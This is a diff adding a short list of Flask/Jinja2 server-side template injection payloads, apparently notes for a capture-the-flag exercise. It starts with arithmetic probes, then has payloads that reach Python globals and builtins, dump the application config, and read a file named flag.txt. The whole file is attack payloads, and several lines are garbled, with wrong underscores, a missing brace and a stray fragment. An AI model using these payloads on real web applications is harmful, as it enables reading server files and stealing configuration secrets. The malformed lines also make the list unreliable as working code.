@@ -1,0 +1,22 @@
+{{7*7}}
+
+{{3*23}}
+
+Flask Payloads
+
+{{ get_flashed_messages.__globals__.__builtins__ }}
+
+{{ get_flashed_messages.__globals__ }}
+
+{{ config.items() }}
+
+{{ config }}
+
+{{ get_flashed_messages._globals_.open('flag.txt').read() }}
+
+{ get_flashed_messages._globals_.builtins_.open().read() }}
+builtins_.open()
+
+{{ get_flashed_messages.__globals__.__builtins__ }}
+
+{{ get_flashed_messages.__globals_._builtins__.open() }}
